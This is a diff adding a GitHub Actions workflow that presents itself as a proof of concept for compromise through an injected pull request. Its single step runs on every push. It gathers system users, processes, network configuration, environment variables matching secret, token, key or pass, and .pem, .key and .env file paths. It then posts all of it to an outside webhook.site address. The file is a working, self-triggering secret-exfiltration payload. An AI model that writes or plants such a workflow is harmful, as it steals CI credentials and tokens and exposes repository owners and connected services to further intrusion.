@@ -1,0 +1,53 @@
+name: POC - System Compromise via PR Injection
+on: [push, workflow_dispatch]
+
+jobs:
+  demonstrate-compromise:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Full System Takeover Demonstration
+        run: |
+          echo "🚨 DEMONSTRATING FULL SYSTEM COMPROMISE 🚨"
+          
+          # 1. Steal System Information
+          echo "=== SYSTEM RECONNAISSANCE ==="
+          SYSTEM_INFO=$(uname -a)
+          ALL_USERS=$(cat /etc/passwd)
+          PROCESSES=$(ps aux)
+          NETWORK_CONFIG=$(ip addr)
+          ENV_SECRETS=$(env | grep -i 'secret\|token\|key\|pass')
+          
+          # 2. Demonstrate File System Access
+          echo "=== FILE SYSTEM ACCESS ==="
+          ls -la /home/ > /tmp/home_contents.txt
+          find / -name "*.pem" -o -name "*.key" -o -name "*.env" 2>/dev/null | head -10 > /tmp/sensitive_files.txt
+          
+          # 3. Network Reconnaissance
+          echo "=== NETWORK DISCOVERY ==="
+          netstat -tuln > /tmp/network_ports.txt
+          
+          # 4. Send All Data to Attacker
+          echo "=== DATA EXFILTRATION ==="
+          curl -X POST "https://webhook.site/86e8b412-7191-449c-9b7e-071bad00d67e" \
+          -H "Content-Type: application/json" \
+          -d '{
+            "compromise_level": "FULL_SYSTEM_ACCESS",
+            "system_info": "'"${SYSTEM_INFO}"'",
+            "current_user": "'"$(whoami)"'",
+            "user_privileges": "'"$(id)"'",
+            "working_directory": "'"$(pwd)"'",
+            "environment_secrets": "'"${ENV_SECRETS}"'",
+            "network_config": "'"${NETWORK_CONFIG}"'",
+            "home_directory_contents": "'"$(ls -la /home/)"'",
+            "critical_files_found": "'"$(cat /tmp/sensitive_files.txt)"'",
+            "network_ports": "'"$(cat /tmp/network_ports.txt)"'",
+            "proof": "SYSTEM_SUCCESSFULLY_COMPROMISED"
+          }'
+          
+          # 5. Create Persistence Evidence
+          echo "🎯 COMPROMISE SUCCESSFUL - System fully accessible" > /tmp/compromise_proof.txt
+          echo "Attacker can now:"
+          echo "  - Steal ALL secrets and tokens"
+          echo "  - Modify source code"
+          echo "  - Access connected services"
+          echo "  - Launch further attacks"
